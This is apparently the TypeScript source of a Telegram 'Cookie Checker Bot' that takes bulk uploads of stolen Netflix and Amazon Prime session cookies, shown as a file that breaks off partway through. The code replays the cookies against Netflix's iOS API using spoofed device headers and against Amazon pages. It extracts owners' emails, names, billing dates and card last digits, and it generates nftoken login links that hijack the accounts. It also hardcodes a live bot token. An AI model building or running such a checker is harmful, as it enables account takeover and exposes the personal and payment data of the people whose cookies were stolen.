// @ts-nocheck
import TelegramBot from "node-telegram-bot-api";
import AdmZip from "adm-zip";
import { Storage } from "./storage";

const BOT_TOKEN = "8601553801:AAFxM_EewEzo2M9xpZXiuFWh4hWzjhBU2rI";
const OWNER_ID = "7606499525";
const DAILY_LIMIT = 500;

const CHANNELS = [
  { url: "https://t.me/ThunderVault8", id: "@ThunderVault8" },
  { url: "https://t.me/netflixhivea", id: "@netflixhivea" },
  { url: "https://t.me/allichetools", id: "@allichetools" },
  { url: "https://t.me/+9njmxL1yJuA4YjE6", id: "" },
];

export function setupBot() {
  const bot = new TelegramBot(BOT_TOKEN, { polling: true });
  const storage = new Storage();
  const pending: Record<number, { action: string }> = {};
  const cancelled = new Set<number>();
  let botUsername = "";

  console.log("🤖 Checker Bot initializing...");

  bot.getMe().then(me => {
    botUsername = me.username || "";
    console.log(`✅ Checker Bot running: @${me.username}`);
  });

  const uncheckableChannels = new Set<string>();

  async function checkChannelMembership(userId: number, chatId: string): Promise<boolean> {
    try {
      const member = await bot.getChatMember(chatId, userId);
      return ["member", "administrator", "creator"].includes(member.status);
    } catch (err: any) {
      const msg = err?.message || "";
      if (msg.includes("chat not found") || msg.includes("bot is not a member") || msg.includes("Bad Request")) {
        console.log(`⚠️ Cannot check channel ${chatId}: ${msg} — skipping in future`);
        uncheckableChannels.add(chatId);
        return true;
      }
      if (msg.includes("user not found") || msg.includes("USER_NOT_PARTICIPANT")) {
        return false;
      }
      console.log(`⚠️ Channel check error ${chatId}: ${msg} — allowing through`);
      return true;
    }
  }

  async function checkAllChannels(userId: number): Promise<boolean> {
    for (const ch of CHANNELS) {
      if (!ch.id || ch.url.includes("/+")) continue;
      if (uncheckableChannels.has(ch.id)) continue;
      const ok = await checkChannelMembership(userId, ch.id);
      if (!ok) return false;
    }
    return true;
  }

  function joinChannelsKeyboard(): TelegramBot.InlineKeyboardButton[][] {
    const rows: TelegramBot.InlineKeyboardButton[][] = [];
    CHANNELS.forEach((ch, i) => {
      rows.push([{ text: `📢 Channel ${i + 1}`, url: ch.url }]);
    });
    rows.push([{ text: "✅ I Joined All", callback_data: "check_joined" }]);
    return rows;
  }

  async function sendJoinMessage(chatId: number) {
    await bot.sendMessage(chatId,
      `⚠️ <b>You must join all channels first!</b>\n\nJoin the channels below, then click "I Joined All":`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: joinChannelsKeyboard() } }
    );
  }

  function isOwner(userId: number): boolean {
    return String(userId) === OWNER_ID;
  }

  function mainMenu(): TelegramBot.InlineKeyboardButton[][] {
    return [
      [{ text: "🔴 Netflix Checker", callback_data: "nf_checker" }, { text: "📺 Prime Video Checker", callback_data: "prime_checker" }],
      [{ text: "🔑 NF Token Generator", callback_data: "nf_token" }],
      [{ text: "👤 My Profile", callback_data: "profile" }, { text: "👑 VIP Subscribe", callback_data: "vip_info" }],
      [{ text: "🔗 Referral Link", callback_data: "referral" }],
    ];
  }

  function adminMenu(): TelegramBot.InlineKeyboardButton[][] {
    const config = storage.getConfig();
    const nfStatus = config.netflixLocked ? "🔒" : "🔓";
    const primeStatus = config.primeLocked ? "🔒" : "🔓";
    return [
      [{ text: "📊 Bot Stats", callback_data: "admin_stats" }],
      [{ text: "👑 VIP Users", callback_data: "admin_vip" }, { text: "➕ Add VIP", callback_data: "admin_add_vip" }],
      [{ text: `${nfStatus} Netflix: ${config.netflixLocked ? "Locked" : "Open"}`, callback_data: config.netflixLocked ? "admin_unlock_nf" : "admin_lock_nf" }],
      [{ text: `${primeStatus} Prime: ${config.primeLocked ? "Locked" : "Open"}`, callback_data: config.primeLocked ? "admin_unlock_prime" : "admin_lock_prime" }],
      [{ text: "📢 Broadcast", callback_data: "admin_broadcast" }],
      [{ text: "🚫 Ban User", callback_data: "admin_ban_prompt" }, { text: "✅ Unban User", callback_data: "admin_unban_prompt" }],
      [{ text: "🚫 Banned Users", callback_data: "admin_banned" }],
      [{ text: "👥 All Users", callback_data: "admin_users" }],
      [{ text: "🔗 Referral Settings", callback_data: "admin_referral" }],
      [{ text: "🔙 Main Menu", callback_data: "main_menu" }],
    ];
  }

  const COUNTRY_NAMES: Record<string, string> = {
    TR: "Turkey", US: "United States", GB: "United Kingdom", DE: "Germany", FR: "France",
    BR: "Brazil", IN: "India", JP: "Japan", KR: "South Korea", CA: "Canada", AU: "Australia",
    IT: "Italy", ES: "Spain", MX: "Mexico", AR: "Argentina", CL: "Chile", CO: "Colombia",
    SA: "Saudi Arabia", AE: "UAE", EG: "Egypt", PH: "Philippines", TH: "Thailand", ID: "Indonesia",
    MY: "Malaysia", SG: "Singapore", PK: "Pakistan", BD: "Bangladesh", NL: "Netherlands",
    BE: "Belgium", SE: "Sweden", NO: "Norway", DK: "Denmark", FI: "Finland", PL: "Poland",
    PT: "Portugal", GR: "Greece", RO: "Romania", HU: "Hungary", CZ: "Czech Republic",
    IL: "Israel", ZA: "South Africa", NG: "Nigeria", KE: "Kenya", TW: "Taiwan", HK: "Hong Kong",
  };

  function getCountryFlag(code: string): string {
    if (!code || code.length !== 2) return "🌍";
    try {
      return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
    } catch { return "🌍"; }
  }

  function esc(s: string): string {
    return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  }

  function cleanCookie(raw: string): string {
    let c = raw.trim();
    if (c.startsWith("NetflixId=")) c = c.substring("NetflixId=".length);
    if (c.startsWith("netflixid=")) c = c.substring("netflixid=".length);
    const semicolonIdx = c.indexOf(";");
    if (semicolonIdx !== -1) c = c.substring(0, semicolonIdx);
    return c.trim();
  }

  function parseCookiesFromText(text: string): string[] {
    const lines = text.split(/[\n\r]+/);
    const cookies: string[] = [];
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.length < 10) continue;
      if (trimmed.startsWith("#") || trimmed.startsWith("//")) continue;
      const parts = trimmed.split(/[,\t|]+/);
      for (const part of parts) {
        const cleaned = cleanCookie(part);
        if (cleaned.length >= 10) {
          cookies.push(cleaned);
        }
      }
    }
    return cookies;
  }

  function cleanPrimeCookie(raw: string): string {
    let c = raw.trim();
    if (c.startsWith("session-id=")) c = c.substring("session-id=".length);
    if (c.startsWith("ubid-main=")) c = c.substring("ubid-main=".length);
    if (c.startsWith("at-main=")) c = c.substring("at-main=".length);
    const semicolonIdx = c.indexOf(";");
    if (semicolonIdx !== -1) c = c.substring(0, semicolonIdx);
    return c.trim();
  }

  function parsePrimeCookiesFromText(text: string): string[] {
    const lines = text.split(/[\n\r]+/);
    const cookies: string[] = [];
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.length < 5) continue;
      if (trimmed.startsWith("#") || trimmed.startsWith("//")) continue;
      cookies.push(trimmed);
    }
    return cookies;
  }

  interface NFCheckResult {
    success: boolean;
    token?: string;
    loginUrl?: string;
    expires?: string;
    country?: string;
    countryName?: string;
    plan?: string;
    price?: string;
    email?: string;
    name?: string;
    memberSince?: string;
    nextBilling?: string;
    payment?: string;
    cardInfo?: string;
    phone?: string;
    quality?: string;
    streams?: string;
    profiles?: string[];
    profileCount?: number;
    membershipStatus?: string;
    error?: string;
    cookie?: string;
  }

  async function checkNetflixCookie(netflixId: string): Promise<NFCheckResult> {
    try {
      const url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48";
      const params = new URLSearchParams({
        appVersion: "15.48.1",
        config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        device_type: "NFAPPL-02-",
        esn: "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        idiom: "phone",
        iosVersion: "15.8.5",
        isTablet: "false",
        languages: "en-US",
        locale: "en-US",
        maxDeviceWidth: "375",
        model: "saget",
        modelType: "IPHONE8-1",
        odpAware: "true",
        path: '["account","token","default"]',
        pathFormat: "graph",
        pixelDensity: "2.0",
        progressive: "false",
        responseFormat: "json",
      });

      const headers: Record<string, string> = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "x-netflix.request.attempt": "1",
        "x-netflix.client.idiom": "phone",
        "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.argo.translated": "true",
        "x-netflix.context.form-factor": "phone",
        "x-netflix.context.sdk-version": "2012.4",
        "x-netflix.client.appversion": "15.48.1",
        "x-netflix.context.max-device-width": "375",
        "x-netflix.context.ab-tests": "",
        "x-netflix.client.type": "argo",
        "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "x-netflix.context.locales": "en-US",
        "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.client.iosversion": "15.8.5",
        "accept-language": "en-US;q=1",
        "x-netflix.context.os-version": "15.8.5",
        "x-netflix.request.client.context": '{"appState":"foreground"}',
        "x-netflix.context.ui-flavor": "argo",
        "x-netflix.argo.nfnsm": "9",
        "x-netflix.context.pixel-density": "2.0",
        "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.request.client.timezoneid": "Asia/Dhaka",
        "Cookie": `NetflixId=${netflixId}`,
      };

      const res = await fetch(`${url}?${params.toString()}`, { headers, signal: AbortSignal.timeout(30000) });
      const rawText = await res.text();

      if (res.status !== 200) return { success: false, error: `HTTP ${res.status}` };

      let data: any;
      try { data = JSON.parse(rawText); } catch { return { success: false, error: "JSON parse failed" }; }

      const account = data?.value?.account;
      if (!account) return { success: false, error: "Invalid response / expired cookie" };

      const tokenInfo = account?.token?.default;
      if (!tokenInfo?.token) return { success: false, error: "No token in response" };

      const tokenValue = tokenInfo.token;
      const expiresMs = tokenInfo.expires;
      const expiresDate = new Date(expiresMs).toISOString();
      const loginUrl = `https://netflix.com/account?nftoken=${tokenValue}`;

      const result: NFCheckResult = {
        success: true,
        token: tokenValue,
        loginUrl,
        expires: expiresDate,
        country: "Unknown",
        countryName: "Unknown",
        plan: "Unknown",
        email: "",
        name: "",
        cookie: netflixId,
      };

      try {
        const deep = (obj: any, ...keys: string[]) => {
          let v = obj;
          for (const k of keys) { v = v?.[k]; if (v === undefined) return undefined; }
          return v;
        };
        result.email = account.email || account.emailAddress || deep(account, "userInfo", "email") || "";
        result.name = account.firstName || deep(account, "userInfo", "firstName") || "";
        const ms = account.membershipStatus || {};
        result.country = ms.countryOfSignup || ms.currentCountry || account.countryOfSignup || deep(account, "userInfo", "countryOfSignup") || "Unknown";
        result.countryName = COUNTRY_NAMES[result.country] || result.country;
        result.plan = ms.currentPlanName || ms.planName || deep(account, "planDetails", "planName") || "Unknown";
      } catch {}

      try {
        const acctRes = await fetch("https://www.netflix.com/YourAccount", {
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Cookie": `NetflixId=${netflixId}`,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
          },
          redirect: "follow",
          signal: AbortSignal.timeout(15000),
        });
        const html = await acctRes.text();
        const reactMatch = html.match(/netflix\.reactContext\s*=\s*({.+?});\s*<\/script>/s);
        if (reactMatch) {
          const ctx = JSON.parse(reactMatch[1].replace(/\\x([0-9a-fA-F]{2})/g, (_: any, hex: string) => String.fromCharCode(parseInt(hex, 16))));
          const findInObj = (obj: any, key: string, depth = 0): any => {
            if (!obj || typeof obj !== "object" || depth > 8) return undefined;
            if (obj[key] !== undefined) return obj[key];
            for (const k of Object.keys(obj)) {
              const r = findInObj(obj[k], key, depth + 1);
              if (r !== undefined) return r;
            }
            return undefined;
          };

          if (!result.email) result.email = findInObj(ctx, "memberEmail") || findInObj(ctx, "email") || "";
          if (!result.name) result.name = findInObj(ctx, "firstName") || "";

          const country = findInObj(ctx, "countryOfSignup") || findInObj(ctx, "currentCountry") || "";
          if (country && result.country === "Unknown") {
            result.country = country;
            result.countryName = COUNTRY_NAMES[country] || country;
          }

          const plan = findInObj(ctx, "currentPlanName") || findInObj(ctx, "planName") || "";
          if (plan && result.plan === "Unknown") result.plan = plan;

          const price = findInObj(ctx, "currentPlanPrice") || findInObj(ctx, "planPrice");
          if (price) {
            const curr = findInObj(ctx, "planCurrency") || findInObj(ctx, "currencyCode") || "";
            result.price = curr ? `${price} ${curr}` : String(price);
          }

          const memberSince = findInObj(ctx, "memberSince") || findInObj(ctx, "startDate");
          if (memberSince) {
            const d = new Date(memberSince);
            if (!isNaN(d.getTime())) result.memberSince = d.toLocaleDateString("en-US", { month: "long", year: "numeric" });
          }

          const nextBill = findInObj(ctx, "nextBillingDate") || findInObj(ctx, "nextPaymentDate");
          if (nextBill) {
            const d = new Date(nextBill);
            if (!isNaN(d.getTime())) result.nextBilling = d.toLocaleDateString("en-US", { day: "numeric", month: "short", year: "numeric" });
          }

          const payType = findInObj(ctx, "currentPaymentType") || findInObj(ctx, "paymentType");
          if (payType) result.payment = payType;

          const card = findInObj(ctx, "lastFourDigits") || findInObj(ctx, "cardLastFourDigits");
          if (card) result.cardInfo = `****${card}`;

          result.membershipStatus = findInObj(ctx, "membershipStatus") || findInObj(ctx, "userStatus");
          result.quality = findInObj(ctx, "videoQuality") || findInObj(ctx, "hdAvailable") ? "HD/UHD" : "";

          const profiles = findInObj(ctx, "profiles");
          if (profiles && typeof profiles === "object") {
            const pList: string[] = [];
            const arr = Array.isArray(profiles) ? profiles : Object.values(profiles);
            for (const p of arr) {
              if (p?.firstName) pList.push(p.firstName);
              else if (p?.profileName) pList.push(p.profileName);
            }
            if (pList.length > 0) {
              result.profiles = pList;
              result.profileCount = pList.length;
            }
          }
        }
      } catch {}

      return result;
    } catch (err: any) {
      return { success: false, error: err.message || "Unknown error" };
    }
  }

  interface PrimeCheckResult {
    success: boolean;
    isPrime: boolean;
    country?: string;
    countryName?: string;
    name?: string;
    email?: string;
    marketplace?: string;
    error?: string;
  }

  async function checkPrimeCookie(cookieLine: string): Promise<PrimeCheckResult> {
    try {
      const res = await fetch("https://www.amazon.com/gp/video/settings/ref=atv_set_ho", {
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
          "Cookie": cookieLine,
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.9",
        },
        redirect: "follow",
        signal: AbortSignal.timeout(20000),
      });

      const html = await res.text();

      if (res.url.includes("/ap/signin") || html.includes("ap_email") || html.length < 1000) {
        return { success: true, isPrime: false, error: "Expired / Invalid cookie" };
      }

      const result: PrimeCheckResult = {
        success: true,
        isPrime: false,
        country: "Unknown",
        countryName: "Unknown",
      };

      const isPrime = html.includes("primeBenefits") || html.includes("prime-logo") ||
                       html.includes("primeCustomerStatus") || html.includes("prime_benefits") ||
                       html.includes("\"isPrimeMember\":true") || html.includes("Prime Video");
      result.isPrime = isPrime;

      const nameMatch = html.match(/\"customerName\"\s*:\s*\"([^\"]+)\"/) || html.match(/id="nav-link-accountList-nav-line-1"[^>]*>([^<]+)/);
      if (nameMatch) result.name = nameMatch[1].trim();

      const emailMatch = html.match(/\"email\"\s*:\s*\"([^\"]+)\"/) || html.match(/name="email"[^>]*value="([^"]+)"/);
      if (emailMatch) result.email = emailMatch[1].trim();

      const marketMatch = html.match(/\"marketplaceId\"\s*:\s*\"([^\"]+)\"/) || html.match(/ue_mid\s*=\s*'([^']+)'/);
      if (marketMatch) result.marketplace = marketMatch[1];

      const MARKET_COUNTRIES: Record<string, string> = {
        ATVPDKIKX0DER: "US", A1F83G8C2ARO7P: "GB", A13V1IB3VIYZZH: "FR", A1PA6795UKMFR9: "DE",
        APJ6JRA9NG5V4: "IT", A1RKKUPIHCS9HS: "ES", A21TJRUUN4KGV: "IN", A2Q3Y263D00KWC: "BR",
        A1VC38T7YXB528: "JP", ARBP9OOSHTCHU: "EG", A2VIGQ35RCS4UG: "AE", A17E79C6D8DWNP: "SA",
        A39IBJ37TRP1C6: "AU", A2EUQ1WTGCTBG2: "CA", AAHKV2X7AFBER: "CN", A1AM78C64UM0Y8: "MX",
      };

      if (result.marketplace && MARKET_COUNTRIES[result.marketplace]) {
        result.country = MARKET_COUNTRIES[result.marketplace];
        result.countryName = COUNTRY_NAMES[result.country] || result.country;
      }

      return result;
    } catch (err: any) {
      return { success: false, isPrime: false, error: err.message || "Unknown error" };
    }
  }

  function formatNFHit(h: NFCheckResult, idx: number): string {
    const flag = getCountryFlag(h.country || "");
    let msg = `✅ <b>Hit #${idx}</b>\n${"─".repeat(25)}\n`;
    msg += `${flag} <b>Country:</b> ${esc(h.countryName || h.country || "Unknown")}\n`;
    msg += `📦 <b>Plan:</b> ${esc(h.plan || "Unknown")}\n`;
    if (h.price) msg += `💰 <b>Price:</b> ${esc(h.price)}\n`;
    if (h.email) msg += `📧 <b>Email:</b> <code>${esc(h.email)}</code>\n`;
    if (h.name) msg += `👤 <b>Name:</b> ${esc(h.name)}\n`;
    if (h.memberSince) msg += `📅 <b>Member Since:</b> ${esc(h.memberSince)}\n`;
    if (h.nextBilling) msg += `💳 <b>Next Billing:</b> ${esc(h.nextBilling)}\n`;
    if (h.payment) msg += `💲 <b>Payment:</b> ${esc(h.payment)}\n`;
    if (h.cardInfo) msg += `🏦 <b>Card:</b> ${esc(h.cardInfo)}\n`;
    if (h.profiles && h.profiles.length > 0) msg += `👥 <b>Profiles (${h.profiles.length}):</b> ${h.profiles.map(esc).join(", ")}\n`;
    msg += `\n🔗 <b>Token:</b> <code>${esc(h.token || "")}</code>\n`;
    msg += `\n🔗 <a href="${esc(h.loginUrl || "")}">Click here to login</a>`;
    return msg;
  }

  function formatPrimeHit(h: PrimeCheckResult, idx: number): string {
    const flag = getCountryFlag(h.country || "");
    let msg = `✅ <b>Hit #${idx}</b>\n${"─".repeat(25)}\n`;
    msg += `${flag} <b>Country:</b> ${esc(h.countryName || h.country || "Unknown")}\n`;
    msg += `📺 <b>Prime:</b> ${h.isPrime ? "✅ Active" : "❌ No Prime"}\n`;
    if (h.name) msg += `👤 <b>Name:</b> ${esc(h.name)}\n`;
    if (h.email) msg += `📧 <b>Email:</b> <code>${esc(h.email)}</code>\n`;
    if (h.marketplace) msg += `🏪 <b>Marketplace:</b> ${esc(h.marketplace)}\n`;
    return msg;
  }

  async function extractFileText(msg: TelegramBot.Message): Promise<string | null> {
    if (!msg.document) return null;
    const doc = msg.document;
    const fname = (doc.file_name || "").toLowerCase();
    try {
      const fileLink = await bot.getFileLink(doc.file_id);
      const fileRes = await fetch(fileLink);
      if (fname.endsWith(".zip")) {
        const arrayBuf = await fileRes.arrayBuffer();
        const zip = new AdmZip(Buffer.from(arrayBuf));
        const entries = zip.getEntries();
        const allFiles = entries.filter(e => !e.isDirectory);
        let text = "";
        for (const entry of allFiles) {
          const content = entry.getData().toString("utf8");
          if (content.length > 10) text += content + "\n";
        }
        await bot.sendMessage(msg.chat.id, `📦 ZIP: extracted ${allFiles.length} file(s)`, { parse_mode: "HTML" });
        return text;
      } else {
        return await fileRes.text();
      }
    } catch (err: any) {
      await bot.sendMessage(msg.chat.id, `❌ Error reading file: ${err.message}`);
      return null;
    }
  }

  bot.onText(/\/start(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from!.id;
    const username = msg.from?.username || "";
    const firstName = msg.from?.first_name || "";
    const startParam = (match?.[1] || "").trim();

    let referredBy: string | undefined;
    if (startParam.startsWith(" ref_") || startParam.startsWith("ref_")) {
      const refId = startParam.replace(/^\s*ref_/, "");
      if (refId && refId !== String(userId)) {
        const existing = storage.getUser(String(userId));
        if (!existing) {
          referredBy = refId;
        }
      }
    }

    const isNew = !storage.getUser(String(userId));
    storage.getOrCreateUser(String(userId), username, firstName, referredBy);

    if (isNew && referredBy) {
      const refUser = storage.getUser(referredBy);
      const bonus = storage.getConfig().referralBonus;
      if (refUser) {
        try {
          await bot.sendMessage(Number(referredBy),
            `🎉 <b>New Referral!</b>\n\n${esc(firstName)} joined using your link!\n🎁 You earned <b>+${bonus}</b> bonus checks!`,
            { parse_mode: "HTML" }
          );
        } catch {}
      }
    }

    if (CHANNELS.length > 0 && !await checkAllChannels(userId)) {
      return sendJoinMessage(chatId);
    }

    await bot.sendMessage(chatId,
      `🔍 <b>Cookie Checker Bot</b>\n${"─".repeat(30)}\n\nWelcome, <b>${esc(firstName)}</b>!\n\nChoose a checker below:`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() } }
    );
  });

  bot.onText(/\/admin/, async (msg) => {
    if (!isOwner(msg.from!.id)) return;
    await bot.sendMessage(msg.chat.id,
      `🛡️ <b>Admin Panel</b>\n${"─".repeat(30)}`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: adminMenu() } }
    );
  });

  bot.onText(/\/vip (.+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    const args = match![1].split(" ");
    const targetId = args[0];
    const days = args[1] ? parseInt(args[1]) : undefined;
    storage.setVip(targetId, days);
    await bot.sendMessage(msg.chat.id, `✅ VIP granted to ${targetId}${days ? ` for ${days} days` : " (permanent)"}`);
  });

  bot.onText(/\/unvip (.+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    storage.removeVip(match![1]);
    await bot.sendMessage(msg.chat.id, `✅ VIP removed from ${match![1]}`);
  });

  bot.onText(/\/ban (.+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    storage.banUser(match![1]);
    await bot.sendMessage(msg.chat.id, `⛔ Banned user ${match![1]}`);
  });

  bot.onText(/\/unban (.+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    storage.unbanUser(match![1]);
    await bot.sendMessage(msg.chat.id, `✅ Unbanned user ${match![1]}`);
  });

  bot.onText(/\/setbonus (.+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    const val = parseInt(match![1]);
    if (isNaN(val) || val < 1) {
      return bot.sendMessage(msg.chat.id, "❌ Invalid number. Usage: /setbonus 100");
    }
    storage.setReferralBonus(val);
    await bot.sendMessage(msg.chat.id, `✅ Referral bonus set to <b>${val}</b> checks per referral.`, { parse_mode: "HTML" });
  });

  bot.onText(/\/cancel/, async (msg) => {
    const uid = msg.from!.id;
    cancelled.add(uid);
    delete pending[uid];
    await bot.sendMessage(msg.chat.id, "❌ Cancelled.", {
      reply_markup: { inline_keyboard: mainMenu() }
    });
  });

  bot.on("callback_query", async (query) => {
    const chatId = query.message!.chat.id;
    const userId = query.from.id;
    const data = query.data || "";

    await bot.answerCallbackQuery(query.id);

    const user = storage.getUser(String(userId));
    if (!user) {
      return bot.sendMessage(chatId, "Please use /start first.");
    }

    if (user.isBanned) {
      return bot.sendMessage(chatId, "⛔ You are banned.");
    }

    if (data === "check_joined") {
      if (await checkAllChannels(userId)) {
        return bot.sendMessage(chatId,
          `✅ <b>Verified!</b> You can now use the bot.`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() } }
        );
      } else {
        return bot.sendMessage(chatId, "❌ You haven't joined all channels yet!", {
          reply_markup: { inline_keyboard: joinChannelsKeyboard() }
        });
      }
    }

    if (CHANNELS.length > 0 && !await checkAllChannels(userId)) {
      return sendJoinMessage(chatId);
    }

    if (data === "main_menu") {
      return bot.sendMessage(chatId,
        `🔍 <b>Cookie Checker Bot</b>\n${"─".repeat(30)}\n\nChoose a checker:`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() } }
      );
    }

    if (data === "cancel_check") {
      cancelled.add(userId);
      delete pending[userId];
      return bot.sendMessage(chatId, "❌ Check cancelled!", {
        reply_markup: { inline_keyboard: mainMenu() }
      });
    }

    if (data === "profile") {
      const vip = storage.isVip(String(userId));
      const used = storage.getDailyChecks(String(userId));
      const bonus = storage.getBonusChecks(String(userId));
      const baseRemaining = vip ? "♾️ Unlimited" : `${Math.max(0, DAILY_LIMIT - used + bonus)}`;
      const vipUser = storage.getUser(String(userId));
      const vipExp = vipUser?.vipExpiresAt ? new Date(vipUser.vipExpiresAt).toLocaleDateString("en-US", { day: "numeric", month: "short", year: "numeric" }) : "♾️ Permanent";
      const referrals = (vipUser as any)?.referralCount || 0;

      let text = `👤 <b>My Profile</b>\n${"─".repeat(25)}\n\n`;
      text += `🆔 <b>ID:</b> <code>${userId}</code>\n`;
      text += `👤 <b>Name:</b> ${esc(user.firstName)}\n`;
      if (user.username) text += `📎 <b>Username:</b> @${esc(user.username)}\n`;
      text += `\n📊 <b>Today's Checks:</b> ${used}\n`;
      text += `📋 <b>Remaining:</b> ${baseRemaining}\n`;
      if (bonus > 0) text += `🎁 <b>Bonus Checks:</b> ${bonus}\n`;
      text += `🔗 <b>Referrals:</b> ${referrals}\n`;
      text += `\n${vip ? `👑 <b>VIP:</b> Yes | Expires: ${vipExp}` : "👤 <b>Status:</b> Free User"}`;

      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔗 Referral Link", callback_data: "referral" }, { text: "🔙 Main Menu", callback_data: "main_menu" }]] }
      });
    }

    if (data === "referral") {
      const refLink = `https://t.me/${botUsername}?start=ref_${userId}`;
      const bonus = storage.getConfig().referralBonus;
      const referrals = (user as any)?.referralCount || 0;
      const totalBonus = storage.getBonusChecks(String(userId));
      let text = `🔗 <b>Referral Program</b>\n${"─".repeat(25)}\n\n`;
      text += `📤 Share your link and earn <b>+${bonus}</b> bonus checks per referral!\n\n`;
      text += `🔗 <b>Your Link:</b>\n<code>${refLink}</code>\n\n`;
      text += `👥 <b>Your Referrals:</b> ${referrals}\n`;
      text += `🎁 <b>Bonus Checks Available:</b> ${totalBonus}\n\n`;
      text += `💡 When someone joins using your link, you both benefit!`;
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
      });
    }

    if (data === "nf_checker") {
      const config = storage.getConfig();
      if (config.netflixLocked && !isOwner(userId)) {
        return bot.sendMessage(chatId, "🔒 Netflix Checker is currently locked by admin.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
        });
      }

      const vip = storage.isVip(String(userId)) || isOwner(userId);
      const used = storage.getDailyChecks(String(userId));
      if (!vip && used >= DAILY_LIMIT) {
        return bot.sendMessage(chatId,
          `⚠️ You've reached your daily limit of <b>${DAILY_LIMIT}</b> checks.\n\n👑 Get VIP for unlimited access!\nContact: @XK6271`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] } }
        );
      }

      const remaining = vip ? "♾️ Unlimited" : `${DAILY_LIMIT - used} remaining`;
      pending[userId] = { action: "nf_check" };
      return bot.sendMessage(chatId,
        `🔴 <b>Netflix Cookie Checker</b>\n${"─".repeat(30)}\n\n📊 ${remaining}\n\n📋 Send Netflix cookies (NetflixId values)\n\n📝 <b>Format:</b>\n• One cookie per line (text)\n• 📄 Any file type (.txt, .csv, .json, etc.)\n• 📦 .zip file (auto-extract)\n\n⏳ Each cookie will be checked for:\n✅ Active subscription\n🌍 Country\n📦 Plan type\n🔗 Login token\n\n💡 Send your cookies now or type /cancel`,
        { parse_mode: "HTML" }
      );
    }

    if (data === "prime_checker") {
      const config = storage.getConfig();
      if (config.primeLocked && !isOwner(userId)) {
        return bot.sendMessage(chatId, "🔒 Prime Video Checker is currently locked by admin.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
        });
      }

      const vip = storage.isVip(String(userId)) || isOwner(userId);
      const used = storage.getDailyChecks(String(userId));
      if (!vip && used >= DAILY_LIMIT) {
        return bot.sendMessage(chatId,
          `⚠️ You've reached your daily limit of <b>${DAILY_LIMIT}</b> checks.\n\n👑 Get VIP for unlimited access!\nContact: @XK6271`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] } }
        );
      }

      const remaining = vip ? "♾️ Unlimited" : `${DAILY_LIMIT - used} remaining`;
      pending[userId] = { action: "prime_check" };
      return bot.sendMessage(chatId,
